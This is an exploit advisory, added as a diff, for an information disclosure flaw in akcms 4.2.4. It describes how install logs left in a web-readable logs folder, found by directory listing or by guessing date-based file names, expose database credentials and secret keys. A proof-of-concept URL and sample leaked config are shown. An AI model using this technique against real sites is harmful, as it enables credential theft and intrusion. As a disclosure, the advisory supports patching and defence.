@@ -1,0 +1,54 @@
+############################################
+### Exploit Title: akcms v4.2.4 Information Disclosure Vulnerability
+### Date: 10/09/2012 
+### Author: L0n3ly-H34rT 
+### Contact: l0n3ly_h34rt@hotmail.com 
+### My Site: http://se3c.blogspot.com/ 
+### Vendor Link: http://www.akcms.com/
+### Software Link: http://download.akcms.com/download/akcms4.2.4.tar.gz
+### Version: 4.2.4 ( may be old version is affect ! i don't check )
+### Tested on: Linux/Windows 
+############################################
+
+# Explanation :
+
+When you install script as first time, it will be generate file log & if we enter here for example :
+
+http://127.0.0.1/akcms4.2.4/logs/
+
+we see two files log:
+
+1- for config log e.g. :
+
+20120910.log
+
+2- for failed login e.g. :
+
+admin20120910.log
+
+if we see first file, we see the name of file as the date when install script, but if we enter the folder and permission of index is on, we can read it ..
+
+or we can brute force of that file by some programmer found in google or you can generate simple script for yourself ..
+
+# P.O.C :
+
+http://127.0.0.1/akcms4.2.4/logs/20120910.log
+
+you will see the information of config like this for example :
+
+16:57:56    127.0.0.1    file=install    $dbtype = 'mysql';
+$dbhost = 'localhost';
+$dbuser = 'root';
+$dbpw = '000000';
+$dbname = 'ak';
+$tablepre = 'ak';
+$charset = 'utf8';
+$timedifference = '0';
+$template_path = 'ak';
+$codekey = 'snGrZU';
+$cookiepre = '9x5G74';
+
+
+############################################
+
+# Greetz to my friendz 		 	   		  
